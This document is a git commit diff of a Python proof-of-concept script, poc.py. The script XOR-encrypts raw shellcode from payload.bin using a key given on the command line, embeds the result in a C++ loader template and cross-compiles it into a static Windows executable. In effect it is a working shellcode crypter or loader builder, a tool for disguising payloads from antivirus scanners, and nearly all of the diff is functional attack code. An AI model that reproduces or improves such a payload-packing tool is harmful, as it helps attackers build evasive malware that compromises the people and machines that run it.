aa551a4bdbc458cec317918c0e4b54be3326da2a
XANA <97038943+lorenzo-matilla@users.noreply.github.com>
2023-12-30 00:51:26 +0100

    Update poc.py

--- poc.py
+++ poc.py
@@ -2,6 +2,13 @@ import sys
 import string
 import os
 import base64
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument('key', help='key to encrypt the payload with.')
+args = parser.parse_args()
+secret_key = args.key
+print("The payload will be xor with this key : " + secret_key)
 
 def read_source():
         source = open("poc.cpp", "rt")
@@ -15,17 +22,18 @@ def read_shellcode():
         return data
         payload.close()
 
-def convert_base64():
-        payload = open("payload.bin", "rb")
-        data = payload.read()
-        data = base64.b64encode(data)
-        return data
-        payload.close()
+# Convert payload in base64 
+#def convert_base64():
+#        payload = open("payload.bin", "rb")
+#        data = payload.read()
+#        data = base64.b64encode(data)
+#        return data
+#        payload.close()
 
 def xor_encrypt():
         payload = open("payload.bin", "rb")
         data = payload.read()
-        key = "secret"
+        key = secret_key # Key for the exection of the exe
         key_stream = [ord(key[i % len(key)]) for i in range(len(data))]
         encrypted_bytes = bytes([a ^ b for a, b in zip(data, key_stream)])
         return encrypted_bytes
@@ -35,12 +43,12 @@ def main():
         source = read_source()
 
         payload = xor_encrypt()
-        format_payload =  '"\\x' + '\\x'.join(hex(x)[2:] for x in payload) + '";'
+        format_payload =  '"\\x' + '\\x'.join(hex(x)[2:] for x in payload) + '";' # Transformation of the payload to use the right format 
 
         #print(source)
         print(format_payload)
 
-        new_code = source.replace('unsigned char shellcode[] = "";', 'unsigned char shellcode[] = ' + format_payload)
+        new_code = source.replace('unsigned char shellcode[] = "";', 'unsigned char shellcode[] = ' + format_payload) # add the payload in the new-poc.cpp
 
         #print(new_code)
 
@@ -48,7 +56,7 @@ def main():
         pwn.write(new_code)
         pwn.close()
 
-        os.system("x86_64-w64-mingw32-g++ --static new-poc.cpp -o poc.exe")
+        os.system("x86_64-w64-mingw32-g++ --static new-poc.cpp -o poc.exe") 
 
 if __name__ == "__main__":
         main()
